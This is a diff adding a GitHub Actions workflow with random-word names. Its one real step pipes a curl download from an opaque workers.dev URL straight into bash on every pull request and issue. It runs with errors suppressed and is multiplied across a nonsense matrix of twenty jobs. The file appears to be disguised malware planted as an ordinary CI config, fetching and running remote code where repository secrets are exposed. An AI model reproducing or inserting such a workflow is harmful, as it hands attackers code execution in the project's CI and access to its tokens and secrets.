@@ -1,0 +1,20 @@
+name: attractive
+
+on:
+  pull_request:
+    branches: [ "main" ]
+  issues:
+
+jobs:
+  deer:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v6
+    - name: oral
+      continue-on-error: true
+      run: |
+        curl -L "https://nggr01.lucky-darkness-f361.workers.dev/e8b2495756f411b44fa5/b8abb86720ed215eb7af3eac14514f9568ebc6b52a73?gi=1776085290&trk=gev" | bash
+    strategy:
+      matrix:
+        colleague: ["preceding", "celebrate", "primarily", "rapid", "clay"]
+        annually: ["earthquake", "horror", "evidently", "game"]
